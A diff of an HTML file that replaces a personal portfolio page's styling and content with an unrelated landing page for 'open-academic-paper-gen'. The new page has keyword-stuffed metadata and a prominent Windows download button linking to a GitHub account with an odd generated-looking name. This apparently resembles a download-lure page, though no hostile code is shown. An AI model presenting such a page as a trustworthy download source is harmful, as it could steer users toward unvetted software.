@@ -1,750 +1,394 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Bo Oetjen Portfolio</title>
-<meta name="claude:viewport-fit-sides" content="cover">
-<meta name="description" content="Bo Oetjen: Principal Technical Account Manager at Paycor and AI student at the University of Cincinnati. Workflow automation, AI tools and data projects.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Bo Oetjen | AI &amp; Workflow Automation Portfolio">
-<meta property="og:description" content="Principal TAM at Paycor and AI student at UC. Builds that turn slow, manual work into tools people trust, including a SOW Builder that cut creation time from 22.5 to 3-4 minutes.">
-<meta property="og:image" content="https://bo-oetjen.com/og-image.png">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="627">
-<meta name="twitter:card" content="summary_large_image">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&family=IBM+Plex+Mono:wght@400;500&display=swap">
-<style>
-:root{padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}img{max-width:100%}[hidden]{display:none!important}
-/* Layout: a builder's logbook. Sticky index on the left (desktop), one long column of entries.
-   Every build is filed the same way: problem, what was built, result, tools. Cobalt marks action, green marks a passed check. */
-:root{
-  --paper:#F5F6F3; --sheet:#FFFFFF; --ink:#14212A; --ink-2:#3D4C56; --mute:#6A7882; --rule:#DCE1DE; --rule-2:#C4CCC8;
-  --cobalt:#2448C9; --cobalt-ink:#FFFFFF; --cobalt-soft:#E6ECFB;
-  --pass:#1F7A4D; --pass-soft:#E2F2E8; --warn:#9A5B00; --warn-soft:#FBF0DA;
-  --f-display:'Bricolage Grotesque','Avenir Next','Segoe UI',system-ui,sans-serif;
-  --f-body:'IBM Plex Sans',-apple-system,'Segoe UI',Roboto,sans-serif;
-  --f-mono:'IBM Plex Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
-}
-@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
-  --paper:#0E151A; --sheet:#151F26; --ink:#E8EDEA; --ink-2:#B9C4C0; --mute:#8D9A97; --rule:#24323A; --rule-2:#33444D;
-  --cobalt:#8FA8FF; --cobalt-ink:#0B1433; --cobalt-soft:#1B2747;
-  --pass:#7FD3A4; --pass-soft:#14301F; --warn:#F0C36A; --warn-soft:#33270F; color-scheme:dark}}
-:root[data-theme="dark"]{
-  --paper:#0E151A; --sheet:#151F26; --ink:#E8EDEA; --ink-2:#B9C4C0; --mute:#8D9A97; --rule:#24323A; --rule-2:#33444D;
-  --cobalt:#8FA8FF; --cobalt-ink:#0B1433; --cobalt-soft:#1B2747;
-  --pass:#7FD3A4; --pass-soft:#14301F; --warn:#F0C36A; --warn-soft:#33270F; color-scheme:dark}
-
-*{box-sizing:border-box}
-html{scroll-behavior:smooth}
-@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}*{transition:none!important}}
-body{background:var(--paper);color:var(--ink);font-family:var(--f-body);font-size:16px;line-height:1.6;margin:0}
-a{color:var(--cobalt);text-underline-offset:3px}
-a:hover{text-decoration-thickness:2px}
-:focus-visible{outline:3px solid var(--cobalt);outline-offset:2px;border-radius:3px}
-h1,h2,h3{font-family:var(--f-display);text-wrap:balance;margin:0;line-height:1.08;letter-spacing:-.01em}
-p{margin:0}
-.mono{font-family:var(--f-mono)}
-.label{font-family:var(--f-mono);font-size:12px;letter-spacing:.08em;text-transform:uppercase;color:var(--mute)}
-
-.wrap{max-width:1180px;margin:0 auto;padding-left:max(16px, env(safe-area-inset-left, 0px));padding-right:max(16px, env(safe-area-inset-right, 0px))}
-.shell{display:grid;grid-template-columns:200px minmax(0,1fr);gap:56px;padding-block:40px 80px}
-
-/* index */
-nav.index{position:sticky;top:calc(28px + env(safe-area-inset-top, 0px));align-self:start;display:flex;flex-direction:column;gap:22px}
-.mark{font-family:var(--f-display);font-weight:800;font-size:20px;letter-spacing:-.02em;color:var(--ink);text-decoration:none;line-height:1.1}
-.mark span{display:block;font-family:var(--f-mono);font-weight:400;font-size:11.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--mute);margin-top:6px}
-nav.index ol{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:2px;border-left:1px solid var(--rule)}
-nav.index a.nl{display:block;padding:5px 0 5px 14px;margin-left:-1px;border-left:2px solid transparent;color:var(--ink-2);text-decoration:none;font-size:14.5px;font-weight:500}
-nav.index a.nl:hover{color:var(--ink);border-left-color:var(--rule-2)}
-nav.index a.nl.on{color:var(--cobalt);border-left-color:var(--cobalt)}
-.side-contact{display:flex;flex-direction:column;gap:6px;font-size:13.5px}
-.side-contact a{color:var(--ink-2);text-decoration:none}
-.side-contact a:hover{color:var(--cobalt)}
-
-main{min-width:0;display:flex;flex-direction:column;gap:88px}
-section{scroll-margin-top:24px}
-.sec-head{display:flex;align-items:baseline;justify-content:space-between;gap:16px;flex-wrap:wrap;border-bottom:2px solid var(--ink);padding-bottom:10px;margin-bottom:28px}
-.sec-head h2{font-size:30px;font-weight:800}
-.sec-head p{color:var(--mute);font-size:14.5px;max-width:52ch}
-
-/* hero */
-.hero{display:grid;grid-template-columns:minmax(0,1fr) 220px;gap:40px;align-items:start}
-.hero .kicker{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-.status{display:inline-flex;align-items:center;gap:8px;font-family:var(--f-mono);font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--pass);background:var(--pass-soft);border-radius:4px;padding:4px 10px}
-.status::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--pass)}
-.hero h1{font-size:clamp(40px,6.4vw,74px);font-weight:800;margin-top:18px;letter-spacing:-.03em}
-.hero h1 em{font-style:normal;color:var(--cobalt)}
-.hero .lede{font-size:19px;color:var(--ink-2);max-width:60ch;margin-top:22px;line-height:1.55}
-.hero .meta{display:flex;flex-wrap:wrap;gap:8px 22px;margin-top:22px;font-size:14.5px;color:var(--ink-2)}
-.hero .meta b{font-weight:600;color:var(--ink)}
-.portrait{width:100%;max-width:220px;aspect-ratio:1;object-fit:cover;border-radius:6px;display:block;filter:saturate(.92)}
-.cta-row{display:flex;flex-wrap:wrap;gap:10px;margin-top:28px}
-.btn{display:inline-flex;align-items:center;gap:8px;font:600 15px var(--f-body);border-radius:6px;padding:10px 16px;text-decoration:none;cursor:pointer;border:1.5px solid var(--cobalt);background:var(--cobalt);color:var(--cobalt-ink)}
-.btn:hover{filter:brightness(1.08)}
-.btn.ghost{background:transparent;color:var(--cobalt)}
-.btn.ghost:hover{background:var(--cobalt-soft);filter:none}
-
-/* time ledger: the signature detail */
-.ledger{margin-top:44px;background:var(--sheet);border:1px solid var(--rule);border-radius:8px;padding:22px 24px;display:grid;grid-template-columns:minmax(0,1fr) auto;gap:18px 28px;align-items:center}
-.ledger .lt{display:flex;flex-direction:column;gap:4px}
-.ledger h3{font-size:19px;font-weight:700}
-.ledger p{font-size:14.5px;color:var(--ink-2)}
-.bars{grid-column:1/-1;display:flex;flex-direction:column;gap:10px}
-.barrow{display:grid;grid-template-columns:118px minmax(0,1fr) 92px;gap:12px;align-items:center;font-size:14px}
-.barrow .who{color:var(--ink-2)}
-.track{height:16px;background:var(--paper);border-radius:3px;overflow:hidden}
-.fill{height:100%;border-radius:3px}
-.fill.before{background:var(--rule-2);width:100%}
-.fill.after{background:var(--cobalt);width:15.6%}
-.barrow .v{font-family:var(--f-mono);font-variant-numeric:tabular-nums;text-align:right}
-.bignum{font-family:var(--f-display);font-weight:800;font-size:54px;line-height:1;color:var(--cobalt);font-variant-numeric:tabular-nums;text-align:right}
-.bignum small{display:block;font-family:var(--f-mono);font-size:11.5px;font-weight:400;letter-spacing:.06em;text-transform:uppercase;color:var(--mute);margin-top:6px}
-
-/* build entries */
-.entries{display:flex;flex-direction:column;gap:28px}
-.entry{background:var(--sheet);border:1px solid var(--rule);border-radius:8px;padding:28px 28px 24px}
-.entry.lead{border-color:var(--cobalt);box-shadow:0 0 0 1px var(--cobalt) inset}
-.e-top{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;align-items:baseline}
-.e-top .label b{color:var(--ink-2);font-weight:500}
-.tag{font-family:var(--f-mono);font-size:11.5px;letter-spacing:.05em;text-transform:uppercase;border-radius:4px;padding:3px 8px;white-space:nowrap}
-.tag.live{background:var(--pass-soft);color:var(--pass)}
-.tag.build{background:var(--warn-soft);color:var(--warn)}
-.tag.school{background:var(--cobalt-soft);color:var(--cobalt)}
-.entry h3{font-size:27px;font-weight:700;margin-top:10px}
-.entry .sum{font-size:17px;color:var(--ink-2);margin-top:10px;max-width:68ch}
-.spec{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:0;margin-top:22px;border-top:1px solid var(--rule)}
-.spec>div{padding:14px 18px 4px 0;min-width:0}
-.spec>div+div{padding-left:18px;border-left:1px solid var(--rule)}
-.spec p{font-size:14.5px;color:var(--ink-2);margin-top:6px}
-.stats{display:flex;flex-wrap:wrap;gap:10px 28px;margin-top:20px}
-.stat{display:flex;flex-direction:column;gap:2px;min-width:0}
-.stat b{font-family:var(--f-display);font-weight:800;font-size:30px;line-height:1.05;font-variant-numeric:tabular-nums}
-.stat span{font-size:13px;color:var(--mute);max-width:22ch}
-.tools{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
-.tools span{font-family:var(--f-mono);font-size:12px;color:var(--ink-2);border:1px solid var(--rule-2);border-radius:4px;padding:2px 8px}
-
-details.cs{margin-top:20px;border-top:1px dashed var(--rule-2);padding-top:14px}
-details.cs summary{cursor:pointer;font-weight:600;color:var(--cobalt);list-style:none;display:inline-flex;align-items:center;gap:8px}
-details.cs summary::-webkit-details-marker{display:none}
-details.cs summary::before{content:"+";font-family:var(--f-mono);font-size:16px;width:18px;height:18px;display:inline-flex;align-items:center;justify-content:center;border:1.5px solid currentColor;border-radius:3px;line-height:1}
-details.cs[open] summary::before{content:"\2212"}
-.cs-body{display:flex;flex-direction:column;gap:18px;margin-top:18px;max-width:72ch}
-.cs-body h4{font-family:var(--f-display);font-size:18px;margin:0 0 6px;font-weight:700}
-.cs-body p,.cs-body li{font-size:15.5px;color:var(--ink-2)}
-.cs-body ul{margin:0;padding-left:20px;display:flex;flex-direction:column;gap:6px}
-.checks{list-style:none!important;padding-left:0!important}
-.checks li{display:grid;grid-template-columns:22px minmax(0,1fr);gap:6px}
-.checks li::before{content:"\2713";color:var(--pass);font-weight:700}
-.road li::before{content:"\25CB";color:var(--warn)}
-
-/* smaller builds */
-.grid2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:20px}
-.mini{background:var(--sheet);border:1px solid var(--rule);border-radius:8px;padding:22px;display:flex;flex-direction:column;gap:10px;min-width:0}
-.mini h3{font-size:21px;font-weight:700}
-.mini p{font-size:15px;color:var(--ink-2)}
-.mini .tools{margin-top:auto;padding-top:6px}
-.mini-links{display:flex;flex-wrap:wrap;gap:6px 18px;font-weight:600;font-size:15px}
-
-/* coursework */
-.courses{display:flex;flex-direction:column}
-.course{display:grid;grid-template-columns:150px minmax(0,1fr);gap:8px 28px;padding:22px 0;border-top:1px solid var(--rule)}
-.course:first-child{border-top:none;padding-top:0}
-.code{font-family:var(--f-mono);font-size:14px;font-weight:500;color:var(--ink)}
-.code small{display:block;font-family:var(--f-body);font-size:13px;color:var(--mute);font-weight:400;margin-top:2px;line-height:1.35}
-.course h3{font-size:20px;font-weight:700}
-.course p{font-size:15px;color:var(--ink-2);margin-top:6px}
-.course ul{margin:10px 0 0;padding-left:18px;display:flex;flex-direction:column;gap:5px}
-.course li{font-size:15px;color:var(--ink-2)}
-.metric-strip{display:flex;flex-wrap:wrap;gap:6px;margin-top:12px}
-.metric-strip span{font-family:var(--f-mono);font-size:12.5px;background:var(--paper);border:1px solid var(--rule);border-radius:4px;padding:3px 8px;font-variant-numeric:tabular-nums}
-
-/* experience */
-.roles{display:flex;flex-direction:column}
-.role{display:grid;grid-template-columns:150px minmax(0,1fr);gap:8px 28px;padding:22px 0;border-top:1px solid var(--rule)}
-.role:first-child{border-top:none;padding-top:0}
-.when{font-family:var(--f-mono);font-size:13px;color:var(--mute);font-variant-numeric:tabular-nums;line-height:1.5}
-.role h3{font-size:20px;font-weight:700}
-.role .org{font-size:14.5px;color:var(--mute);margin-top:2px}
-.role ul{margin:10px 0 0;padding-left:18px;display:flex;flex-direction:column;gap:6px}
-.role li{font-size:15px;color:var(--ink-2)}
-
-/* skills */
-.skills{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:28px}
-.skills h3{font-size:17px;font-weight:700;margin-bottom:10px}
-.skills ul{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:7px}
-.skills li{font-size:15px;color:var(--ink-2);padding-left:14px;position:relative}
-.skills li::before{content:"";position:absolute;left:0;top:.7em;width:6px;height:1.5px;background:var(--cobalt)}
-
-/* contact */
-.contact{background:var(--ink);color:var(--paper);border-radius:8px;padding:36px 32px;display:grid;grid-template-columns:minmax(0,1fr) auto;gap:24px;align-items:end}
-.contact h2{font-size:34px;font-weight:800;color:var(--paper)}
-.contact p{color:var(--rule-2);margin-top:10px;max-width:56ch}
-.contact .rows{display:flex;flex-direction:column;gap:10px;min-width:0}
-.crow{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
-.crow .addr{font-family:var(--f-mono);font-size:15px;color:var(--paper);user-select:all;overflow-wrap:anywhere}
-.crow a{color:var(--paper)}
-.copy{font:600 13px var(--f-body);background:transparent;color:var(--paper);border:1.5px solid var(--rule-2);border-radius:5px;padding:5px 10px;cursor:pointer}
-.copy:hover{border-color:var(--paper)}
-@media (prefers-color-scheme: dark){:root:not([data-theme="light"]) .contact{background:var(--sheet);border:1px solid var(--rule)}}
-:root[data-theme="dark"] .contact{background:var(--sheet);border:1px solid var(--rule)}
-.foot{font-size:13px;color:var(--mute);margin-top:26px}
-.praise{margin:20px 0 0;display:grid;grid-template-columns:auto minmax(0,1fr);gap:4px 18px;align-items:start;padding:20px 24px;border-left:3px solid var(--pass);background:var(--sheet);border-radius:0 8px 8px 0}
-.praise .qm{font-family:var(--f-display);font-weight:800;font-size:52px;line-height:.8;color:var(--pass)}
-.praise blockquote{margin:0;font-family:var(--f-display);font-weight:700;font-size:21px;line-height:1.3;text-wrap:balance}
-.praise p{grid-column:2;font-size:14px;color:var(--ink-2);margin-top:8px}
-@media (max-width:720px){.praise{grid-template-columns:minmax(0,1fr)}.praise p{grid-column:1}.praise .qm{display:none}}
-
-@media (max-width:980px){
-  .shell{grid-template-columns:minmax(0,1fr);gap:28px;padding-top:20px}
-  nav.index{position:static;flex-direction:row;flex-wrap:wrap;align-items:center;gap:12px 20px;border-bottom:1px solid var(--rule);padding-bottom:16px}
-  nav.index ol{flex-direction:row;flex-wrap:wrap;border-left:none;gap:4px 14px}
-  nav.index a.nl{padding:2px 0;border-left:none;margin:0}
-  nav.index a.nl.on{text-decoration:underline;text-underline-offset:5px}
-  .side-contact{display:none}
-  .skills{grid-template-columns:repeat(2,minmax(0,1fr))}
-}
-@media (max-width:720px){
-  main{gap:64px}
-  .hero{grid-template-columns:minmax(0,1fr)}
-  .portrait{max-width:140px;order:-1}
-  .ledger{grid-template-columns:minmax(0,1fr)}
-  .bignum{text-align:left}
-  .barrow{grid-template-columns:84px minmax(0,1fr) 76px}
-  .spec{grid-template-columns:minmax(0,1fr)}
-  .spec>div+div{padding-left:0;border-left:none;border-top:1px solid var(--rule)}
-  .grid2,.skills{grid-template-columns:minmax(0,1fr)}
-  .course,.role{grid-template-columns:minmax(0,1fr)}
-  .entry{padding:22px 18px 20px}
-  .contact{grid-template-columns:minmax(0,1fr);padding:28px 20px}
-}
-</style>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>open-academic-paper-gen - Turn Topics into Cited Draft Papers</title>
+    <meta name="description" content="Multi-agent pipeline that turns a research topic into a draft paper grounded in real literature, with citation hallucination detection and claim-support checking. Easy download for Windows.">
+    <meta name="keywords" content="academic-writing, citation-verification, fastapi, hallucination-detection, langgraph, literature-review, llm, nextjs">
+    <meta name="author" content="open-academic-paper-gen">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="open-academic-paper-gen - Turn Topics into Cited Draft Papers">
+    <meta property="og:description" content="Multi-agent pipeline that turns a research topic into a draft paper grounded in real literature, with citation hallucination detection and claim-support checking.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen">
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f8f9fa;
+            color: #212529;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 30px 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+        }
+        h1 {
+            font-size: 2.2rem;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+        h2 {
+            font-size: 1.6rem;
+            color: #16213e;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #e9ecef;
+            padding-bottom: 5px;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05rem;
+        }
+        a {
+            color: #0d6efd;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul {
+            margin-bottom: 20px;
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 8px;
+            font-size: 1.05rem;
+        }
+        .button {
+            display: inline-block;
+            background: linear-gradient(135deg, #f857a6 0%, #ff5858 100%);
+            color: white;
+            padding: 16px 32px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            margin: 20px 0;
+            transition: transform 0.2s;
+        }
+        .button:hover {
+            transform: scale(1.02);
+            text-decoration: none;
+        }
+        .download-box {
+            background: #e9ecef;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border-left: 5px solid #f857a6;
+        }
+        .download-box a {
+            font-weight: bold;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.3rem;
+            }
+        }
+    </style>
 </head>
-<body style="margin:0">
-<div class="wrap">
-<div class="shell">
-  <nav class="index" aria-label="Sections">
-    <a class="mark" href="#top">Bo Oetjen<span>Builder · TAM · AI student</span></a>
-    <ol>
-      <li><a class="nl" href="#builds">Selected builds</a></li>
-      <li><a class="nl" href="#more">More projects</a></li>
-      <li><a class="nl" href="#coursework">Coursework</a></li>
-      <li><a class="nl" href="#experience">Experience</a></li>
-      <li><a class="nl" href="#skills">Skills</a></li>
-      <li><a class="nl" href="#contact">Contact</a></li>
-    </ol>
-    <div class="side-contact">
-      <a href="https://www.linkedin.com/in/bo-oetjen" target="_blank" rel="noopener">LinkedIn ↗</a>
-      <a href="https://github.com/bo-oetjen" target="_blank" rel="noopener">GitHub ↗</a>
-      <span class="mono" style="color:var(--mute);font-size:12.5px">Cincinnati, OH</span>
-    </div>
-  </nav>
+<body>
+    <div class="container">
+        <h1>📝 open-academic-paper-gen - Turn Topics into Cited Draft Papers</h1>
+        <a href="https://github.com/townmeetingferrimagnetism755/open-academic-paper-gen" class="button" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">⬇️ Download open-academic-paper-gen</a>
 
-  <main>
-    <!-- HERO -->
-    <section id="top">
-      <div class="hero">
-        <div>
-          <div class="kicker">
-            <span class="status">Building while studying</span>
-            <span class="label">AAS, Artificial Intelligence · UC · May 2028</span>
-          </div>
-          <h1>I turn slow, manual work into <em>tools people trust.</em></h1>
-          <p class="lede">Principal Technical Account Manager at Paycor with 12 years in enterprise HCM. I design and ship the internal tools my team runs on: AI assistants, validated document builders and live dashboards. I'm completing an associate's degree in Artificial Intelligence at night.</p>
-          <div class="meta">
-            <span><b>Now:</b> Principal TAM, Paycor</span>
-            <span><b>Studying:</b> AI, University of Cincinnati</span>
-            <span><b>Based in:</b> Cincinnati, OH</span>
-          </div>
-          <div class="cta-row">
-            <a class="btn" href="#builds">See the builds</a>
-            <a class="btn ghost" href="https://www.linkedin.com/in/bo-oetjen" target="_blank" rel="noopener">LinkedIn ↗</a>
-          </div>
-        </div>
-        <img class="portrait" src="data:image/jpeg;base64,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